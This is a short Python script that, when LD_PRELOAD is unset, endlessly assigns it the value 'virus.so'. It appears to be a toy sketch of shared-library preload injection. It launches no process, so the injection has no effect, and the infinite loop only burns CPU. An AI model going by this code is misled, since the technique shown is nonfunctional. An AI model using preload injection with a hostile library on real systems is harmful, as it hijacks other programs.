import os


def main():
    addval = "virus.so"
    if os.environ.get("LD_PRELOAD", None):
        print("there is something at ld_preload")
    else:
        while True:
            os.environ["LD_PRELOAD"] = addval


if __name__ == "__main__":
    main()